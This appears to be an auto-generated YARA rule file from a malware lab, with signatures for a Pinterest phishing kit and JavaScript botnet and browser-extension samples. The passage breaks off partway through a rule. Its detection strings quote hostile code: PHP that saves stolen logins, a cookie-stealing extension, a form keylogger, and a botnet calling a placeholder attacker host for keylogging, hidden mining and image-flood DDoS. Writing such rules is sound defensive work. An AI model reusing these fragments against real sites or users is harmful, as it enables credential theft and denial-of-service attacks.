      $s6 = "  -webkit-animation-fill-mode: forwards;" fullword ascii /* score: '13.00'*/
      $s7 = "  -webkit-animation: slidefadeInRight 0.35s cubic-bezier(0.31, 0, 0.31, 1) forwards;" fullword ascii /* score: '13.00'*/
      $s8 = "  display: -webkit-box;" fullword ascii /* score: '8.00'*/
      $s9 = "  -webkit-box-flex: 1;" fullword ascii /* score: '8.00'*/
      $s10 = "  -webkit-box-flex: 0;" fullword ascii /* score: '8.00'*/
      $s11 = "  display: -ms-flexbox;" fullword ascii /* score: '8.00'*/
      $s12 = "  -webkit-box-align: center;" fullword ascii /* score: '8.00'*/
      $s13 = "  -webkit-animation-name: animateWidth;" fullword ascii /* score: '8.00'*/
      $s14 = "  margin-left: -40px;" fullword ascii /* score: '8.00'*/
      $s15 = "  -webkit-animation-duration: 4000ms;" fullword ascii /* score: '8.00'*/
      $s16 = "  -webkit-animation-timing-function: linear;" fullword ascii /* score: '8.00'*/
      $s17 = "  margin-top: -40px;" fullword ascii /* score: '8.00'*/
      $s18 = "  -webkit-box-pack: justify;" fullword ascii /* score: '8.00'*/
      $s19 = "  -webkit-transition: .3s;" fullword ascii /* score: '8.00'*/
      $s20 = "      -webkit-animation: tapAnimation 0.25s cubic-bezier(0.31, 1, 0.34, 1) forwards;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x502e and filesize < 30KB and
      8 of them
}

rule common_desktop_cc5955b1658b3049a89a8e74824afa2e {
   meta:
      description = "phish__pinterest - file common_desktop-cc5955b1658b3049a89a8e74824afa2e.css"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "cd0ceacc2bef7c9aaf9e77adfc19fc3ab5a811115afdf887faaff4794c15ffe1"
   strings:
      $s1 = " * (http://sass-lang.com/docs/yardoc/Sass/Script/Functions.html#opacify-instance_method)" fullword ascii /* score: '27.00'*/
      $s2 = ".Login.compact.lite .compactViewLogin a, .Login.compact.darkText .compactViewLogin a {" fullword ascii /* score: '27.00'*/
      $s3 = ".Login.compact.lite .compactViewLogin a:hover, .Login.compact.darkText .compactViewLogin a:hover {" fullword ascii /* score: '27.00'*/
      $s4 = ".Login.compact.lite .compactViewLogin, .Login.compact.darkText .compactViewLogin {" fullword ascii /* score: '27.00'*/
      $s5 = ".OAuthPage .mainContent .userInfo .loginError {" fullword ascii /* score: '27.00'*/
      $s6 = ".UnauthHomePage .inspiredSearchContentWrapper.loginInspiredWall .termOfServiceWrapper {" fullword ascii /* score: '27.00'*/
      $s7 = ".Login.compact.darkText .standardForm {" fullword ascii /* score: '27.00'*/
      $s8 = ".UnauthHomePage .inspiredSearchContentWrapper.loginInspiredWall .termOfServiceWrapper a {" fullword ascii /* score: '27.00'*/
      $s9 = ".OAuthPageBase .mainContent .loginError {" fullword ascii /* score: '27.00'*/
      $s10 = ".App.full .LoginPage .contents {" fullword ascii /* score: '27.00'*/
      $s11 = ".Login.compact .socialLogin .btn {" fullword ascii /* score: '25.00'*/
      $s12 = ".UnauthBanner .centeredWithinWrapper.gridWidth .textAndButtons .registerButtons .Login.compact .socialLogin .btn span {" fullword ascii /* score: '25.00'*/
      $s13 = ".SentPinSignup .Login.compact .socialLogin .btn .buttonText {" fullword ascii /* score: '25.00'*/
      $s14 = ".UnauthBanner .centeredWithinWrapper.gridWidth .textAndButtons .registerButtons .Login.compact .socialLogin .btn.intButton.unAut" ascii /* score: '25.00'*/
      $s15 = ".UnauthPinInGridCloseup .commentDescriptionContent {" fullword ascii /* score: '25.00'*/
      $s16 = ".SentPinSignup .Login.compact .socialLogin .btn {" fullword ascii /* score: '25.00'*/
      $s17 = "  background: url(https://s.pinimg.com/webapp/style/images/web-auth_logged_out_home_shop-1x-f7182836.jpg) no-repeat;" fullword ascii /* score: '25.00'*/
      $s18 = ".UnauthBanner .centeredWithinWrapper.gridWidth .textAndButtons .registerButtons .Login.compact .socialLogin .btn.intButton.unAut" ascii /* score: '25.00'*/
      $s19 = ".UnauthBanner .centeredWithinWrapper.gridWidth .textAndButtons .registerButtons .Login.compact .socialLogin .btn {" fullword ascii /* score: '25.00'*/
      $s20 = ".OAuthPageBase h2.loginHeading {" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 5000KB and
      8 of them
}

rule gestalt_039ab764a920c98697f74f32bdf681a1 {
   meta:
      description = "phish__pinterest - file gestalt-039ab764a920c98697f74f32bdf681a1.css"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0edda7976899602b456334f2bd97897312872ce6bb1869c9e8c79d553170575d"
   strings:
      $x1 = "._1{display:none}._2{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-direction:row;-webkit-box-orient:horizontal;-" ascii /* score: '31.00'*/
      $s2 = ",Helvetica Neue,Helvetica,\\\\30D2\\30E9\\30AE\\30CE\\89D2\\30B4 Pro W3,Hiragino Kaku Gothic Pro,\\\\30E1\\30A4\\30EA\\30AA,Meir" ascii /* score: '16.00'*/
      $s3 = "t-animation:a .2s cubic-bezier(.31,1,.34,1) forwards;animation:a .2s cubic-bezier(.31,1,.34,1) forwards}@-webkit-keyframes a{to{" ascii /* score: '12.00'*/
      $s4 = "@media (inverted-colors){._s3,._s4{filter:url('data:image/svg+xml;charset=utf-8,<svg xmlns=\"http://www.w3.org/2000/svg\"><filte" ascii /* score: '10.00'*/
      $s5 = "33  \\FF30\\30B4\\30B7\\30C3\\30AF\",Arial,sans-serif;quotes:\"\\300C\" \"\\300D\"}._se{letter-spacing:-.4px}._sf{line-height:1." ascii /* score: '10.00'*/
      $s6 = "end;align-content:flex-end}._3j{-ms-flex-line-pack:center;align-content:center}._3k{-ms-flex-line-pack:justify;align-content:spa" ascii /* score: '9.00'*/
      $s7 = "lex-pack:distribute;justify-content:space-around}._3h{-ms-flex-line-pack:start;align-content:flex-start}._3i{-ms-flex-line-pack:" ascii /* score: '9.00'*/
      $s8 = "ebkit-animation-fill-mode:forwards;animation-fill-mode:forwards;-webkit-animation-iteration-count:1;animation-iteration-count:1;" ascii /* score: '9.00'*/
      $s9 = "ce-between}._3l{-ms-flex-line-pack:distribute;align-content:space-around}._3m{-ms-flex-line-pack:stretch;align-content:stretch}." ascii /* score: '9.00'*/
      $s10 = "fy-content:flex-start}._3d{-ms-flex-pack:end;-webkit-box-pack:end;justify-content:flex-end}._3e{-ms-flex-pack:center;-webkit-box" ascii /* score: '9.00'*/
      $s11 = "-pack:center;justify-content:center}._3f{-ms-flex-pack:justify;-webkit-box-pack:justify;justify-content:space-between}._3g{-ms-f" ascii /* score: '9.00'*/
      $s12 = "{margin:-36px -48px}._rs{margin-top:-36px}._rt{margin-bottom:-36px}._ru{margin-left:-48px}._rv,._rw{margin-right:-48px}._rw{marg" ascii /* score: '8.00'*/
      $s13 = "webkit-transform .2s;transition:transform .2s;transition:transform .2s, -webkit-transform .2s;transition:transform .2s,-webkit-t" ascii /* score: '8.00'*/
      $s14 = "px}._pn{margin-left:8px}._po{margin:-6px -8px}._pp{margin-top:-6px}._pq{margin-bottom:-6px}._pr{margin-left:-8px}._ps,._pt{margi" ascii /* score: '8.00'*/
      $s15 = "x}._q1{margin-bottom:12px}._q2{margin-left:16px}._q3{margin:-12px -16px}._q4{margin-top:-12px}._q5{margin-bottom:-12px}._q6{marg" ascii /* score: '8.00'*/
      $s16 = "top:24px}._qu{margin-right:32px}._qv{margin-bottom:24px}._qw{margin-left:32px}._qx{margin:-24px -32px}._qy{margin-top:-24px}._qz" ascii /* score: '8.00'*/
      $s17 = "x}._qf{margin-right:24px}._qg{margin-bottom:18px}._qh{margin-left:24px}._qi{margin:-18px -24px}._qj{margin-top:-18px}._qk{margin" ascii /* score: '8.00'*/
      $s18 = "2px}._qt{margin-top:24px}._qu{margin-right:32px}._qv{margin-bottom:24px}._qw{margin-left:32px}._qx{margin:-24px -32px}._qy{margi" ascii /* score: '8.00'*/
      $s19 = "n-left:48px}._rr{margin:-36px -48px}._rs{margin-top:-36px}._rt{margin-bottom:-36px}._ru{margin-left:-48px}._rv,._rw{margin-right" ascii /* score: '8.00'*/
      $s20 = "ttom:12px}._q2{margin-left:16px}._q3{margin:-12px -16px}._q4{margin-top:-12px}._q5{margin-bottom:-12px}._q6{margin-left:-16px}._" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5f2e and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule fbevents {
   meta:
      description = "phish__pinterest - file fbevents.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "822cac9dcc726b0a79afcf39c8a6dc6f52cb5377d763efa4346ae0f2b73018a5"
   strings:
      $x1 = "(function(a,b,c,d){var e={exports:{}};e.exports;(function(){var f=a.fbq;f.execStart=a.performance&&a.performance.now&&a.performa" ascii /* score: '65.00'*/
      $x2 = "(function(a,b,c,d){var e={exports:{}};e.exports;(function(){var f=a.fbq;f.execStart=a.performance&&a.performance.now&&a.performa" ascii /* score: '40.00'*/
      $s3 = "nce.now();if(!function(){var b=a.postMessage||function(){};if(!f){b({action:\"FB_LOG\",logType:\"Facebook Pixel Error\",logMessa" ascii /* score: '29.00'*/
      $s4 = "keys,p=k.map,q=k.some,r=c.logError,s=c.logUserError,t={AutomaticMatching:!0,Dwell:!0,FPCookie:!0,Interaction:!0,InferredEvents:!" ascii /* score: '25.00'*/
      $s5 = "* [http://developers.facebook.com/policy/]. This copyright notice shall be" fullword ascii /* score: '25.00'*/
      $s6 = "k.exports;(function(){\"use strict\";var a=f.getFbeventsModules(\"SignalsFBEventsLogging\");a=a.logError;function b(b){return ty" ascii /* score: '24.00'*/
      $s7 = "a=a.logError;var b=f.getFbeventsModules(\"SignalsFBEventsUtils\"),c=b.keys,d=0;b=function(){function b(){var a=this;k(this,b);th" ascii /* score: '24.00'*/
      $s8 = "id actions are 'await' and 'grant'.\";default:w(new Error(\"INVALID_USER_ERROR - \"+a.type+\" - \"+JSON.stringify(a)));return\"I" ascii /* score: '23.00'*/
      $s9 = "ugin:Z};w(\"execEnd\");w(\"initialized\",a)})();return k.exports}(a,b,c,d)});e.exports=f.getFbeventsModules(\"SignalsFBEvents\")" ascii /* score: '23.00'*/
      $s10 = "les(\"SignalsParamList\"),m=a.trigger,n={ENDPOINT:\"https://www.facebook.com/tr/\",PROXY_ENDPOINT:null},o=g.top!==g,p=!1;c=funct" ascii /* score: '23.00'*/
      $s11 = "tsInjectMethod\"),s=a.getFbeventsModules(\"signalsFBEventsMakeSafe\"),t=a.getFbeventsModules(\"SignalsFBEventsConfigStore\"),u=d" ascii /* score: '22.00'*/
      $s12 = "(function(a,b,c,d){var e={exports:{}};e.exports;(function(){var f=a.fbq;f.execStart=a.performance&&a.performance.now&&a.performa" ascii /* score: '22.00'*/
      $s13 = ",d);return this}},{key:\"get\",value:function(a,b){return this._getPixelConfig(a)[b]}},{key:\"getEnforce\",value:function(a,b){v" ascii /* score: '21.00'*/
      $s14 = "fbq.set(\"experiments\", {\"0\":{\"name\":\"beacon\",\"range\":[0,0.02],\"code\":\"b\",\"passRate\":0.5},\"1\":{\"name\":\"logDa" ascii /* score: '21.00'*/
      $s15 = "_config[a]==null&&(this._config[a]={});return this._config[a]}},{key:\"set\",value:function(b,c,d){this._getPixelConfig(b)[c]=a(" ascii /* score: '21.00'*/
      $s16 = ")&&(a[d]=c[d])}return a},b=function(){function b(){k(this,b),this._config={}}i(b,[{key:\"_getPixelConfig\",value:function(a){thi" ascii /* score: '21.00'*/
      $s17 = "ction(){},n=!1;function o(){n=!0}function p(a){if(n)return;m(\"[Facebook Pixel] - \"+a)}var q=\"Facebook Pixel Error\",r=g.postM" ascii /* score: '20.00'*/
      $s18 = "ull&&(e=d.baseURL);e=e+\"/signals/config/\"+a+\"?v=\"+b+\"&r=\"+c;a=h.createElement(\"script\");a.src=e;a.async=!0;d.scriptEleme" ascii /* score: '20.00'*/
      $s19 = "sFBEventsLogging\"),b=a.logUserError,c=/^[+-]?\\d+(\\.\\d+)?$/,d=\"number\",e=\"currency_code\",g={AED:1,ARS:1,AUD:1,BOB:1,BRL:1" ascii /* score: '20.00'*/
      $s20 = "CE_INIT\")}function m(a){j(\"COALESCE_COMPLETE\",a)}function n(a){j(\"FBMQ_FORWARDED\",a,!0)}k.exports={logStartBatch:l,logEndBa" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_index {
   meta:
      description = "phish__pinterest - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_2 {
   meta:
      description = "phish__pinterest - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2f0c47ef6f331cfd4972f6b18c967acafbb48ea47c4a6f96a8adf13b43f9656d"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['id'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '29.00'*/
      $s2 = "header('Location: https://pinterest.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_ip {
   meta:
      description = "phish__pinterest - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/_.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: 
   Date: 2026-02-27
   Identifier: mal
   Reference:  phishing_kit  gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule background {
   meta:
      description = "mal - file background.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "45479cfcb7703be222d35317bf7333d05514944c25baaac122ce1403205e6839"
   strings:
      $s1 = "chrome.runtime.onInstalled.addListener(function(details) {" fullword ascii /* score: '13.00'*/
      $s2 = "        console.log(tabId);" fullword ascii /* score: '11.00'*/
      $s3 = "                console.log(domain);" fullword ascii /* score: '11.00'*/
      $s4 = "                    fetch('http://localhost/server/api.php', {" fullword ascii /* score: '9.00'*/
      $s5 = "                browser.cookies.getAll({domain: domain}, function (cookies) {" fullword ascii /* score: '7.00'*/
      $s6 = "        browser.tabs.get(tabId, function (tab) {" fullword ascii /* score: '7.00'*/
      $s7 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s8 = "            }" fullword ascii /* reversed goodware string '}            ' */ /* score: '6.00'*/
      $s9 = "    browser.webNavigation.onCompleted.addListener(function () {" fullword ascii /* score: '5.00'*/
      $s10 = "                        headers: { \"Content-Type\": \"application/json; charset=utf-8\" }," fullword ascii /* score: '5.00'*/
      $s11 = "  switch (details.reason) {" fullword ascii /* score: '4.00'*/
      $s12 = "// redirect after installation , change my url github to make paypal page" fullword ascii /* score: '4.00'*/
      $s13 = "                        method: 'POST'," fullword ascii /* score: '4.00'*/
      $s14 = "                let domain = tab.url.includes(\"://\") ? tab.url.split(\"://\")[1].split(\"/\")[0] : tab.url.split(\"/\")[0];" fullword ascii /* score: '2.00'*/
      $s15 = "    browser.tabs.onActivated.addListener(function (tab) {" fullword ascii /* score: '2.00'*/
      $s16 = "      chrome.tabs.create({url: \"https://shoppy.gg/product/5d9ifM3\"});" fullword ascii /* score: '2.00'*/
      $s17 = "            Object.keys(obj).forEach(key => {" fullword ascii /* score: '2.00'*/
      $s18 = "                   //let str = unpack(cookies);" fullword ascii /* score: '2.00'*/
      $s19 = "                        body: JSON.stringify({cookie : cookies})" fullword ascii /* score: '2.00'*/
      $s20 = "(function() {" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x0a0d and filesize < 4KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_morris_morris {
   meta:
      description = "mal - file morris.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "561a3453fe6082ff3da7fcdf4eda7acd58a83c642a94306ed40f1cef6a745af7"
   strings:
      $s1 = "        return (_ref = this.hover).update.apply(_ref, this.hoverContentForRow(this.data.length - 1));" fullword ascii /* score: '16.00'*/
      $s2 = "        return \"\" + this.options.preUnits + (Morris.commas(label)) + this.options.postUnits;" fullword ascii /* score: '15.00'*/
      $s3 = "      return Math.min(this.data.length - 1, Math.floor((x - this.left) / (this.width / this.data.length)));" fullword ascii /* score: '14.00'*/
      $s4 = "        return new Date(d.getFullYear() - d.getFullYear() % 10, 0, 1);" fullword ascii /* score: '12.00'*/
      $s5 = "      leftPadding = groupWidth * (1 - this.options.barSizeRatio) / 2;" fullword ascii /* score: '12.00'*/
      $s6 = "      return new Date(parseInt(o[1], 10), parseInt(o[2], 10) - 1, parseInt(o[3], 10)).getTime();" fullword ascii /* score: '12.00'*/
      $s7 = "        ret.setMonth(0, 1 + ((4 - ret.getDay()) + 7) % 7);" fullword ascii /* score: '12.00'*/
      $s8 = "        return new Date(parseInt(q[1], 10), parseInt(q[2], 10) - 1, parseInt(q[3], 10), parseInt(q[4], 10), parseInt(q[5], 10))." ascii /* score: '12.00'*/
      $s9 = "      return new Date(parseInt(n[1], 10), parseInt(n[2], 10) - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s10 = "      return new Date(parseInt(m[1], 10), parseInt(m[2], 10) * 3 - 1, 1).getTime();" fullword ascii /* score: '12.00'*/
      $s11 = "        return new Date(parseInt(r[1], 10), parseInt(r[2], 10) - 1, parseInt(r[3], 10), parseInt(r[4], 10), parseInt(r[5], 10), " ascii /* score: '12.00'*/
      $s12 = "  Morris.commas = function(num) {" fullword ascii /* score: '11.00'*/
      $s13 = "      ymag = Math.floor(Math.log(span) / Math.log(10));" fullword ascii /* score: '11.00'*/
      $s14 = "      C = 1.9999 * Math.PI - min * this.data.length;" fullword ascii /* score: '11.00'*/
      $s15 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < _this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s16 = "        smag = Math.floor(Math.log(step) / Math.log(10));" fullword ascii /* score: '11.00'*/
      $s17 = "      this.xmax = this.data[this.data.length - 1].x;" fullword ascii /* score: '11.00'*/
      $s18 = "leMargin >= labelBox.x) && labelBox.x >= 0 && (labelBox.x + labelBox.width) < this.el.width()) {" fullword ascii /* score: '11.00'*/
      $s19 = "        row = this.data[this.data.length - 1 - i];" fullword ascii /* score: '11.00'*/
      $s20 = "        return this.displayHoverForRow(this.data.length - 1);" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 200KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_server_assets_js_custom {
   meta:
      description = "mal - file custom.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5fe42242513c1293a68982e34db39b1d91e8188bf053c2e0dc0f6f53e5d49da4"
   strings:
      $s1 = "    Authour URI: www.binarycart.com" fullword ascii /* score: '12.00'*/
      $s2 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
      $s3 = "        }" fullword ascii /* reversed goodware string '}        ' */ /* score: '6.00'*/
      $s4 = "                    label: \"Download Sales\"," fullword ascii /* score: '5.00'*/
      $s5 = "    http://opensource.org/licenses/MIT" fullword ascii /* score: '5.00'*/
      $s6 = "    100% To use For Personal And Commercial Use." fullword ascii /* score: '4.00'*/
      $s7 = "}(jQuery));" fullword ascii /* score: '4.00'*/
      $s8 = "                ykeys: ['iphone', 'ipad', 'itouch']," fullword ascii /* score: '2.00'*/
      $s9 = "    $(document).ready(function () {" fullword ascii /* score: '2.00'*/
      $s10 = "                xkey: 'y'," fullword ascii /* score: '2.00'*/
      $s11 = "            Morris.Bar({" fullword ascii /* score: '2.00'*/
      $s12 = "            $(window).bind(\"load resize\", function () {" fullword ascii /* score: '2.00'*/
      $s13 = "                ykeys: ['a', 'b']," fullword ascii /* score: '2.00'*/
      $s14 = "    Version: 1.1" fullword ascii /* score: '2.00'*/
      $s15 = "                xkey: 'period'," fullword ascii /* score: '2.00'*/
      $s16 = "/*=============================================================" fullword ascii /* score: '1.00'*/
      $s17 = " ======================================*/" fullword ascii /* score: '1.00'*/
      $s18 = "(function ($) {" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      uint16(0) == 0x0a0d and filesize < 20KB and
      8 of them
}

rule _opt_mal_botnet_browser_chrome_master__home_ubuntu_malware_lab_samples_extracted_javascript_botnet_browser_chrome_master_extension_js_logger {
   meta:
      description = "mal - file logger.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "d50140fb61b4d0053693c659164475c868f65e09b1db5f66c5effcfc0927f0a7"
   strings:
      $s1 = "console.log(currLoc);" fullword ascii /* score: '19.00'*/
      $s2 = "spyjs_getInput(e.currentTarget);" fullword ascii /* score: '19.00'*/
      $s3 = "console.log(name+\"=\"+value);" fullword ascii /* score: '19.00'*/
      $s4 = "function spyjs_getInput(inputInfo){" fullword ascii /* score: '14.00'*/
      $s5 = "var url = \"http://127.0.0.1/server/\";  // change URL" fullword ascii /* score: '12.00'*/
      $s6 = "        pic.src = url+'log1.php?values='+name+\"=\"+value +  \"<br/>\"+ \"\"+currLoc+\"\"" fullword ascii /* score: '11.00'*/
      $s7 = "function spyjs_saveData(data){" fullword ascii /* score: '9.00'*/
      $s8 = "function spyjs_refreshEvents(){" fullword ascii /* score: '9.00'*/
      $s9 = "spyjs_saveData(\"(\"+currLoc+\")\");" fullword ascii /* score: '9.00'*/
      $s10 = "spyjs_refreshEvents();" fullword ascii /* score: '9.00'*/
      $s11 = "$('checkbox').unbind('change');" fullword ascii /* score: '7.00'*/
      $s12 = "$('input').unbind('change');" fullword ascii /* score: '7.00'*/
      $s13 = "$('textarea').unbind('change');" fullword ascii /* score: '7.00'*/
      $s14 = "$('button').unbind('change');" fullword ascii /* score: '7.00'*/
      $s15 = "$('select').unbind('change');" fullword ascii /* score: '7.00'*/
      $s16 = "if(value != \"\"){" fullword ascii /* score: '4.00'*/
      $s17 = "var value = inputInfo.value;" fullword ascii /* score: '4.00'*/
      $s18 = "$('textarea').change(function(e) {" fullword ascii /* score: '4.00'*/
      $s19 = "if(debug){" fullword ascii /* score: '4.00'*/
      $s20 = "var currLoc = \"\";" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 3KB and
      8 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_bot {
   meta:
      description = "mal - file bot.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $x1 = "var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='" fullword ascii /* score: '33.00'*/
      $s2 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s3 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s4 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s7 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s8 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s9 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s10 = "document.onkeypress = function(e) {" fullword ascii /* score: '10.00'*/
      $s11 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s12 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s13 = "        new Image().src = attacker + data;" fullword ascii /* score: '9.00'*/
      $s14 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s15 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s16 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s17 = "window.setInterval(function() {" fullword ascii /* score: '7.00'*/
      $s18 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s19 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s20 = "var buffer = [];" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6f64 and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_node {
   meta:
      description = "mal - file node.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
   strings:
      $s1 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "document.write(\"<p>You currently running a Node in the HiveMind BotNet...</p>\");" fullword ascii /* score: '5.00'*/
      $s15 = "document.write(\"<title>Running HiveMind Node...</title>\");" fullword ascii /* score: '5.00'*/
      $s16 = "document.write(\"<p>Running...</p>\");" fullword ascii /* score: '5.00'*/
      $s17 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s18 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s19 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x640a and filesize < 2KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _node_bot_0 {
   meta:
      description = "mal - from files node.js, bot.js"
      author = ""
      reference = " phishing_kit  gen"
      date = "2026-02-27"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
      hash2 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $s1 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
